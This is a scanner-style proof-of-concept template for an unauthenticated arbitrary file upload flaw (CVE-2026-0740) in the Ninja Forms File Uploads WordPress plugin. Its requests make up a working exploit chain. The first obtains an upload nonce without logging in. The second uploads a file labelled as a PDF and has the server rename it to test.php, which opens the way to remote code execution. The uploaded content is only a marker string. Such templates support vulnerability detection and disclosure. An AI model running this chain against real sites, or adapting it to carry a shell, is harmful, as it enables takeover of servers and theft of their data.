[info]
id = "POC-AVE-2026-0077"
name = "Ninja Forms File Uploads 未授权任意文件上传 PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "file-upload", "wordpress", "ninja-forms", "cve-2026-0740"]
description = "Ninja Forms File Uploads WordPress 插件 <= 3.3.26 存在未授权任意文件上传漏洞。未经身份验证的攻击者可通过 nf_fu_get_new_nonce 获取 nonce，然后利用 nf_fu_upload 端点上传伪装扩展名的文件并服务端重命名为 PHP 文件，最终实现远程代码执行。"
vuln_id = ["CVE-2026-0740", "AVE-2026-0077"]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/wp-admin/admin-ajax.php"

headers.Content-Type = "application/x-www-form-urlencoded"

body.type = "form"
body.action = "nf_fu_get_new_nonce"
body.field_id = "7"
body.form_id = "7"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["\"success\":true", "\"nonce\":"]
expect = true

[[poc.requests.extractors]]
type = "regex"
part = "body"
name = "nonce"
value = "\"nonce\":\"([a-z0-9]+)\""
group = 1

[[poc.requests]]
method = "POST"
path = "/wp-admin/admin-ajax.php"

headers.Content-Type = "multipart/form-data; boundary=----AVE"

body.type = "raw"
body.content = "------AVE\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nnf_fu_upload\r\n------AVE\r\nContent-Disposition: form-data; name=\"nonce\"\r\n\r\n{{nonce}}\r\n------AVE\r\nContent-Disposition: form-data; name=\"form_id\"\r\n\r\n7\r\n------AVE\r\nContent-Disposition: form-data; name=\"field_id\"\r\n\r\n7\r\n------AVE\r\nContent-Disposition: form-data; name=\"files-7\"; filename=\"test.pdf\"\r\nContent-Type: application/pdf\r\n\r\nAVE_PoC_Test\r\n------AVE\r\nContent-Disposition: form-data; name=\"doc_pdf\"\r\n\r\ntest.php\r\n------AVE--"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["tmp_name", "new_tmp_key"]
expect = true
